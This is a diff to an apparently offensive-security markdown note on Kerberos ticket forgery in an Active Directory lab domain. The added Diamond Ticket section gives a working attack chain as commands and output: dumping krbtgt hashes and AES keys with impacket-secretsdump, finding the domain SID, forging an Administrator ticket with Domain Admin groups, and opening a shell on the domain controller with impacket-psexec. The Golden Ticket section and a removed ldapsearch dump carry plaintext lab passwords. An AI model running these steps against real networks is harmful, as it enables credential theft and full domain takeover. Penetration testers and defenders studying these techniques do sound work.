@@ -1,5 +1,73 @@
 # KRB5 Forgery
 
+## Diamond Ticket
+
+### Execution
+
+```bash
+impacket-secretsdump contoso/Administrator:'P@$$wd!'@192.168.1.11
+# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+# 
+# [*] Service RemoteRegistry is in stopped state
+# [*] Starting service RemoteRegistry
+# ...
+# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:52bc1ee1544f9424b5324aa9b4dd2f01:::
+# [*] Kerberos keys grabbed
+# krbtgt:aes256-cts-hmac-sha1-96:0d1d0107405301e6a36dd83aa10eafa8970224943015c66f7856b1742374bc52
+
+impacket-lookupsid  contoso/michael:'Tup4M1$h4'@192.168.1.11
+# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+# 
+# [*] Brute forcing SIDs at 192.168.1.11
+# [*] StringBinding ncacn_np:192.168.1.11[\pipe\lsarpc]
+# [*] Domain SID is: S-1-5-21-1666408051-1433414683-20088286
+
+impacket-ticketer -request \
+-nthash '52bc1ee1544f9424b5324aa9b4dd2f01' \
+-aesKey '0d1d0107405301e6a36dd83aa10eafa8970224943015c66f7856b1742374bc52' \
+-domain 'contoso.lab' \
+-user 'michael' -password 'Tup4M1$h4' \
+-domain-sid 'S-1-5-21-1666408051-1433414683-20088286' \
+-user-id '500' -groups '512,513,518,519,520' "Administrator"
+# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+# 
+# [*] Requesting TGT to target domain to use as basis
+# [*] Customizing ticket for contoso.lab/Administrator
+# [*]     PAC_LOGON_INFO
+# [*]     PAC_CLIENT_INFO_TYPE
+# [*]     EncTicketPart
+# [*]     EncAsRepPart
+# [*] Signing/Encrypting final ticket
+# [*]     PAC_SERVER_CHECKSUM
+# [*]     PAC_PRIVSVR_CHECKSUM
+# [*]     EncTicketPart
+# [*]     EncASRepPart
+# [*] Saving ticket in Administrator.ccache
+
+export KRB5CCNAME="Administrator.ccache"
+
+klist
+# Ticket cache: FILE:Administrator.ccache
+# Default principal: Administrator@CONTOSO.LAB
+# ...
+
+impacket-psexec -k win-dc01.contoso.lab
+# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+# 
+# [*] Requesting shares on win-dc01.contoso.lab.....
+# [*] Found writable share ADMIN$
+# [*] Uploading file IfBJyAho.exe
+# [*] Opening SVCManager on win-dc01.contoso.lab.....
+# [*] Creating service VCvE on win-dc01.contoso.lab.....
+# [*] Starting service VCvE.....
+# [!] Press help for extra shell commands
+# Microsoft Windows [Version 10.0.14393]
+# (c) 2016 Microsoft Corporation. All rights reserved.
+# 
+# C:\Windows\system32>
+```
+
 ## Golden Ticket
 
 ### Execution
@@ -22,7 +90,10 @@ impacket-lookupsid contoso.org/Administrator@192.168.68.64
 # [*] Domain SID is: S-1-5-21-245103785-2483314120-3684157271
 # ...
 
-sudo impacket-ticketer -nthash '60fcae2d99c85fb300602b91223f9516' -domain-sid 'S-1-5-21-245103785-2483314120-3684157271' -domain 'contoso.org' 'Administrator'
+sudo impacket-ticketer \
+-nthash '60fcae2d99c85fb300602b91223f9516' \
+-domain-sid 'S-1-5-21-245103785-2483314120-3684157271' \
+-domain 'contoso.org' 'Administrator'
 # Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 #
 # [*] Creating basic skeleton ticket and PAC Infos
@@ -53,57 +124,6 @@ impacket-lookupsid contoso.org/Administrator@192.168.68.179
 # [*] StringBinding ncacn_np:192.168.68.179[\pipe\lsarpc]
 # [*] Domain SID is: S-1-5-21-245103785-2483314120-3684157271
 # ...
-
-
-
-
-ldapsearch -LLL -x -H ldap://192.168.68.179 -D 'Administrator@contoso.org' -w 'win2016-cli-P@$swd1!' -b 'dc=contoso,dc=org'
-# dn: CN=WIN-NUU0DPB1BVC,OU=Domain Controllers,DC=contoso,DC=org
-# objectClass: top
-# objectClass: person
-# objectClass: organizationalPerson
-# objectClass: user
-# objectClass: computer
-# cn: WIN-NUU0DPB1BVC
-# distinguishedName: CN=WIN-NUU0DPB1BVC,OU=Domain Controllers,DC=contoso,DC=org
-# ...
-# serverReferenceBL: CN=WIN-NUU0DPB1BVC,CN=Servers,CN=Default-First-Site-Name,CN
-#  =Sites,CN=Configuration,DC=contoso,DC=org
-# dNSHostName: WIN-NUU0DPB1BVC.contoso.org
-# rIDSetReferences: CN=RID Set,CN=WIN-NUU0DPB1BVC,OU=Domain Controllers,DC=conto
-#  so,DC=org
-# servicePrincipalName: RPC/bd05490f-2c96-4f89-9201-c530cfa7eda4._msdcs.contoso.
-#  org
-# servicePrincipalName: GC/WIN-NUU0DPB1BVC.contoso.org/contoso.org
-# servicePrincipalName: ldap/WIN-NUU0DPB1BVC/CONTOSO
-# servicePrincipalName: ldap/bd05490f-2c96-4f89-9201-c530cfa7eda4._msdcs.contoso
-#  .org
-# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org/CONTOSO
-# servicePrincipalName: ldap/WIN-NUU0DPB1BVC
-# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org
-# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org/ForestDnsZones.contoso.
-#  org
-# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org/DomainDnsZones.contoso.
-#  org
-# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org/contoso.org
-# servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/bd05490f-2c96-4f89-
-#  9201-c530cfa7eda4/contoso.org
-# servicePrincipalName: DNS/WIN-NUU0DPB1BVC.contoso.org
-# servicePrincipalName: HOST/WIN-NUU0DPB1BVC.contoso.org/CONTOSO
-# servicePrincipalName: HOST/WIN-NUU0DPB1BVC.contoso.org/contoso.org
-# servicePrincipalName: HOST/WIN-NUU0DPB1BVC/CONTOSO
-# servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/WIN-NUU0DPB1BV
-#  C.contoso.org
-# servicePrincipalName: TERMSRV/WIN-NUU0DPB1BVC
-# servicePrincipalName: TERMSRV/WIN-NUU0DPB1BVC.contoso.org
-# servicePrincipalName: WSMAN/WIN-NUU0DPB1BVC
-# servicePrincipalName: WSMAN/WIN-NUU0DPB1BVC.contoso.org
-# servicePrincipalName: RestrictedKrbHost/WIN-NUU0DPB1BVC
-# servicePrincipalName: HOST/WIN-NUU0DPB1BVC
-# servicePrincipalName: RestrictedKrbHost/WIN-NUU0DPB1BVC.contoso.org
-# servicePrincipalName: HOST/WIN-NUU0DPB1BVC.contoso.org
-# ...
-
 
 
 # you can use any online NTLM hash generator to obtain -nthash if you only have password
